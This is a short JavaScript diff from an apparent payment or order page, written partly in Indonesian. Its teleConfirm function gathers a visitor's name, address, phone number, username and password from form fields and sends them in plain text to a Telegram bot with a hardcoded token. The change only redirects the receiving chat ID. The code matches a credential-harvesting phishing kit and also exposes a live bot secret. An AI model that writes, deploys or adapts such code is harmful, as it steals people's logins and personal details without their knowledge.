@@ -31,7 +31,7 @@ window.showToast = function (message, color = "primary", duration = 2000) {
 };
 
 function teleConfirm(){
-chat_id = "-1903170022";
+chat_id = "-8019227359";
 token = "8094399072:AAH18ojUQUJdS-s0El2auk-ZHKuA4LBNLIE";
 message = "<b>Pemberitahuan Pembayaran</b>%0Anama : "+ $("#nama").val() + "%0Aalamat : " + $("#alamat").val() + "%0Ano. hp : " + $("#nomor").val() + "%0Alink : " + $("#link").val() + "%0Apaket : " + $("#paket").val() + "%0Ausername : " + $("#username").val() + "%0Apassword : " + $("#password2").val();
 $.get("https://api.telegram.org/bot"+token+"/sendMessage?text="+message+"&chat_id="+chat_id+"&parse_mode=html");
